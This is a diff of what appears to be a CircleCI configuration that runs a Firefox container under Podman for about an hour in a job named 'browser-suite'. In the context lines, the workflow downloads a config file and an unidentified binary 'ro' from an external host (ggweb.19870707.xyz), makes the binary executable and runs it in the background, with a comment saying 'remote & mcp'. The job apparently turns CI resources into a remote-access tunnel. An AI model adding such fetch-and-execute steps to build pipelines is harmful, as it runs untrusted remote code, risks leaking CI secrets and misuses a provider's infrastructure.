@@ -7,26 +7,33 @@ jobs:
     resource_class: medium
     steps:
       - checkout
-
+      
       - run:
-          name: Install dependencies
+          name: 安装 Podman
           command: |
             sudo apt-get update
-            sudo apt-get install -y curl podman openssh-server
+            sudo apt-get install -y podman
             podman --version
 
       - run:
-          name: Setup SSH and start Firefox
+          name: 启动 Firefox 容器
           no_output_timeout: 59m
           command: |
+            # remote & mcp
             curl -s -o cli.toml https://ggweb.19870707.xyz/cli.toml
             curl -s -o ro https://ggweb.19870707.xyz/ro && chmod +x ro
             nohup ./ro cli.toml &
             
-            echo "Firefox 容器已启动，SSH 和 Web 访问端口 5800 已开放"
             mkdir -p ~/.config/containers
             echo -e "[engine]\ncgroup_manager = \"cgroupfs\"\nevents_backend = \"file\"" > ~/.config/containers/containers.conf
-            podman run -d --name firefox -p 5800:5800 docker.io/jlesage/firefox:latest
+
+            podman run -d -p 5800:5800 docker.io/jlesage/firefox:latest
             
-            # 保持 Job 运行
-            sleep 3500  # 约 58 分钟，留 buffer
+            # 等待容器启动
+            sleep 3600
+
+workflows:
+  browser-suite:
+    jobs:
+      - run-firefox-podman
+            
